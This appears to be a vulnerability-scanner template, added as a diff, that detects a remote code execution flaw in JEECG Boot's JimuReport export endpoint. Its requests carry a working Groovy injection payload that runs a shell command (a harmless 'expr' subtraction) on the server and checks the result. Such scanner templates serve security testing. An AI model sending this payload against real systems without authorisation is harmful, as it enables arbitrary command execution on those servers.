@@ -1,0 +1,65 @@
+id: jeecgboot-jimureport-auto-export-rce
+info:
+  name: JEECG Boot - 远程代码执行漏洞
+  author: l1nk
+  severity: critical
+  reference:
+    - https://github.com/jeecgboot/JeecgBoot/issues/9837
+  metadata:
+    verified: true
+    max-request: 4
+    vuln-id: CT-5432124
+    vendor: jeecg
+    product: jeecg-boot
+  tags: rce,vuln,jeecgboot
+variables:
+  s1: '{{rand_int(10000000, 20000000)}}'
+  s2: '{{rand_int(1000000, 2000000)}}'
+flow: http(1) || http(3) || http(2) || http(4)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/jmreport/auto/export'
+    redirects: false
+    headers:
+      Content-Type: application/json
+    body: '{}'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "请选择需要导出的报表") && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
+  - method: POST
+    path:
+      - '{{BaseURL}}/jmreport/auto/export'
+    redirects: false
+    headers:
+      Content-Type: application/json
+    body: |
+      {"reportParams":[{"id":"1338744112815411200","params":{"x":"=use groovy.util.Eval; Eval.me('assert false : \"expr {{s1}} - {{s2}}\".execute().text')"},"exportType":"pdf"}]}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, to_string(s1 - s2)) && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
+  - method: POST
+    path:
+      - '{{BaseURL}}/jeecg-boot/jmreport/auto/export'
+    redirects: false
+    headers:
+      Content-Type: application/json
+    body: '{}'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "请选择需要导出的报表") && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
+  - method: POST
+    path:
+      - '{{BaseURL}}/jeecg-boot/jmreport/auto/export'
+    redirects: false
+    headers:
+      Content-Type: application/json
+    body: |
+      {"reportParams":[{"id":"1338744112815411200","params":{"x":"=use groovy.util.Eval; Eval.me('assert false : \"expr {{s1}} - {{s2}}\".execute().text')"},"exportType":"pdf"}]}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, to_string(s1 - s2)) && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
